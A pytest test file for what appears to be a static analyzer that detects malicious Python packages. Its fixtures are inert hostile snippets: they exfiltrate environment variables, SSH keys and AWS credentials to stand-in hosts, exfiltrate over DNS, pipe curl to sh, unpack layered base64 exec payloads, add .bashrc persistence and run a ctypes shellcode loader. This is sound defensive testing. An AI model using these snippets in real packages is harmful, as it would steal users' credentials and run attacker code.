import base64

from conftest import rules_of

from sniffdog.analyzers.python_taint import analyze_python_source
from sniffdog.models import Severity


def scan(src, path="pkg/__init__.py", install=False, imp=True):
    findings, err = analyze_python_source(src, path, install_time=install, import_time=imp)
    assert err is None
    return findings


def test_env_exfil_in_setup_is_critical():
    f = scan("import os, requests\nrequests.post('https://x.invalid', json=dict(os.environ))\n", "setup.py", install=True)
    exfil = [x for x in f if x.rule_id == "PY-EXFIL"]
    assert exfil and exfil[0].severity == Severity.CRITICAL and exfil[0].install_time


def test_interprocedural_flow_through_helpers():
    src = """
import os, requests
def collect():
    return {"e": os.environ.copy()}
def ship(payload, url="https://x.invalid"):
    requests.post(url, json=payload)
def main():
    ship(collect())
main()
"""
    f = [x for x in scan(src) if x.rule_id == "PY-EXFIL"]
    assert f and "env:all" in f[0].evidence["sources"] and "ship()" in f[0].evidence["via"]


def test_keyword_argument_flow_into_summary():
    src = "import os, requests\ndef send(*, data):\n    requests.post('u', data=data)\nsend(data=str(os.environ))\n"
    assert "PY-EXFIL" in rules_of(scan(src))


def test_self_attribute_and_container_flow():
    src = """
import os, urllib.request
class C:
    def __init__(self):
        self.buf = []
        self.buf.append(open(os.path.expanduser("~/.ssh/id_rsa")).read())
    def go(self):
        urllib.request.urlopen("https://x.invalid", data="".join(self.buf).encode())
C().go()
"""
    f = [x for x in scan(src) if x.rule_id == "PY-EXFIL"]
    assert f and "cred" in f[0].evidence["sources"]


def test_sensitive_path_components():
    src = "import pathlib, requests\nk = pathlib.Path.home().joinpath('.aws', 'credentials').read_text()\nrequests.post('u', data=k)\n"
    assert "PY-EXFIL" in rules_of(scan(src))


def test_dns_exfiltration():
    src = "import socket, getpass\nsocket.gethostbyname(getpass.getuser() + '.x.invalid')\n"
    assert "PY-EXFIL-DNS" in rules_of(scan(src, "setup.py", install=True), Severity.HIGH)


def test_layered_base64_is_unpacked_and_analysed():
    inner = "import os,requests\nrequests.post('u', data=open(os.path.expanduser('~/.ssh/id_rsa')).read())"
    layer2 = f"import base64\nexec(base64.b64decode('{base64.b64encode(inner.encode()).decode()}'))"
    src = f"import base64\nexec(base64.b64decode('{base64.b64encode(layer2.encode()).decode()}'))"
    f = scan(src, "setup.py", install=True)
    assert "PY-EXEC-OBFUSCATED" in rules_of(f)
    nested = [x for x in f if x.rule_id == "PY-EXFIL"]
    assert nested and "<layer2" in nested[0].file
    assert any("decoded_preview" in x.evidence for x in f)


def test_constant_folding_chr_and_reverse():
    src = "x = ''.join(chr(c) for c in [111, 115])\nm = __import__(x)\nexec('metsys.so tropmi'[::-1])\n"
    rules = rules_of(scan(src))
    assert "PY-OBFUSCATED-IMPORT" in rules and "PY-EXEC-OBFUSCATED" in rules


def test_getattr_obfuscated_system_call():
    src = "m = __import__('o' + 's')\ngetattr(m, 'sys' + 'tem')('curl -s https://x.invalid/a | sh')\n"
    rules = rules_of(scan(src, "setup.py", install=True))
    assert {"PY-OBFUSCATED-API", "PY-SHELL-DOWNLOAD"} <= rules


def test_remote_code_execution():
    src = "import requests\nexec(requests.get('https://x.invalid/p').text)\n"
    assert "PY-EXEC-REMOTE" in rules_of(scan(src))


def test_download_then_execute():
    src = """import os, urllib.request
from setuptools.command.install import install
class I(install):
    def run(self):
        urllib.request.urlretrieve("http://x.invalid/a", "/tmp/a")
        os.system(path_var)
"""
    assert "PY-DOWNLOAD-EXECUTE" in rules_of(scan(src, "setup.py", install=True))


def test_persistence_bashrc():
    src = "import os\nopen(os.path.expanduser('~/.bashrc'), 'a').write('evil')\n"
    assert "PY-PERSISTENCE" in rules_of(scan(src), Severity.HIGH)


def test_reading_bashrc_is_not_persistence():
    assert "PY-PERSISTENCE" not in rules_of(scan("print(open('/home/u/.bashrc').read())\n"))


def test_main_guard_is_not_import_time():
    src = "import os, requests\nif __name__ == '__main__':\n    requests.post('u', data=str(os.environ))\n"
    f = [x for x in scan(src) if x.rule_id == "PY-EXFIL"]
    assert f and f[0].severity == Severity.HIGH  # not bumped to critical


def test_cmdclass_run_is_install_time_even_outside_setup():
    src = "import os, requests\nfrom setuptools.command.install import install\nclass X(install):\n    def run(self):\n        requests.post('u', data=dict(os.environ))\n"
    f = [x for x in scan(src, "build_helpers.py", imp=False) if x.rule_id == "PY-EXFIL"]
    assert f and f[0].severity == Severity.CRITICAL


# ---------------------------------------------------------------- benign idioms that must stay quiet


def test_api_token_in_header_is_low_at_most():
    src = "import os, requests\nT = os.environ['GITHUB_TOKEN']\ndef get(u):\n    return requests.get(u, headers={'Authorization': T})\n"
    assert all(x.severity <= Severity.LOW for x in scan(src))


def test_proxies_from_env_are_ignored():
    src = "import os, requests\nrequests.get('https://api.example.com', proxies={'https': os.environ['HTTPS_PROXY']})\n"
    assert not scan(src)


def test_setup_exec_version_file():
    src = "about = {}\nexec(open('pkg/__version__.py').read(), about)\n"
    assert not rules_of(scan(src, "setup.py", install=True), Severity.LOW)


def test_subprocess_env_kwarg_is_not_env_exfil():
    src = "import os, subprocess\nsubprocess.run(['git', 'status'], env=os.environ)\n"
    assert not rules_of(scan(src), Severity.LOW)


def test_stdout_write_does_not_taint_sys_module():
    src = "import sys, os, base64\nsys.stdout.write(base64.b64decode('aGk=').decode())\nos.execv(sys.executable, [sys.executable, '-m', 'x'])\n"
    assert "PY-SHELL-OBFUSCATED" not in rules_of(scan(src))


def test_temp_file_write_does_not_taint_name():
    src = """import subprocess, tempfile
def f(data):
    with tempfile.NamedTemporaryFile() as tmp:
        tmp.write(data)
        subprocess.Popen(["openssl", "x509", "-in", tmp.name])
f(bytes.fromhex("00ff"))
"""
    assert "PY-SHELL-OBFUSCATED" not in rules_of(scan(src))


def test_syntax_error_reports_not_crashes():
    findings, err = analyze_python_source("print 'py2'\n", "old.py")
    assert findings == [] and "could not parse" in err


# ---------------------------------------------------------------- regressions from scanning top PyPI packages


def test_list_reversal_is_not_decoding():
    src = "def f(items, code):\n    order = items[::-1]\n    exec(compile(code, '<s>', 'exec'), dict(order))\n"
    assert "PY-EXEC-OBFUSCATED" not in rules_of(scan(src))


def test_string_constant_reversal_is_decoding():
    assert "PY-EXEC-OBFUSCATED" in rules_of(scan("exec(')1(tnirp'[::-1])\n"))


def test_windows_interop_ctypes_is_low_without_loader_signals():
    src = "import ctypes\ndef copy(dst, src, n):\n    ctypes.windll.kernel32.RtlMoveMemory(dst, src, n)\n"
    f = [x for x in scan(src) if x.rule_id == "PY-SHELLCODE"]
    assert f and f[0].severity == Severity.LOW


def test_shellcode_loader_with_decoded_bytes_is_high():
    src = (
        "import ctypes, base64\nbuf = base64.b64decode('kJCQ')\n"
        "p = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)\n"
        "ctypes.windll.kernel32.RtlMoveMemory(p, buf, len(buf))\nctypes.windll.kernel32.CreateThread(0, 0, p, 0, 0, 0)\n"
    )
    assert "PY-SHELLCODE" in rules_of(scan(src), Severity.HIGH)


def test_setup_py_downloading_sources_is_medium_not_high():
    src = "import urllib.request\nurllib.request.urlretrieve('https://example.com/mupdf.tgz', 'mupdf.tgz')\n"
    f = [x for x in scan(src, "setup.py", install=True) if x.rule_id == "PY-DROPPER"]
    assert f and f[0].severity == Severity.MEDIUM


def test_python_m_module_runs_main_block_at_install():
    from sniffdog.analyzers.python_taint import analyze_python_source

    src = "import socket, requests\ndef go():\n    requests.post('https://x.invalid', json={'h': socket.gethostname()})\nif __name__ == '__main__':\n    go()\n"
    f, _ = analyze_python_source(src, "pkg/analytics.py", install_time=True, run_as_main=True)
    assert any(x.rule_id == "PY-EXFIL" and x.install_time for x in f)
    f, _ = analyze_python_source(src, "pkg/analytics.py", install_time=True, run_as_main=False)
    assert not any(x.rule_id == "PY-EXFIL" and x.install_time for x in f)


def test_setup_publish_command_is_not_install_time():
    src = "import os, sys\nif sys.argv[-1] == 'publish':\n    os.system('twine upload dist/*')\n    sys.exit()\n"
    assert not rules_of(scan(src, "setup.py", install=True), Severity.MEDIUM)


def test_install_argv_guard_is_still_install_time():
    src = "import os, sys\nif 'install' in sys.argv:\n    os.system('curl -s https://x.invalid/a | sh')\n"
    assert "PY-SHELL-DOWNLOAD" in rules_of(scan(src, "setup.py", install=True), Severity.CRITICAL)
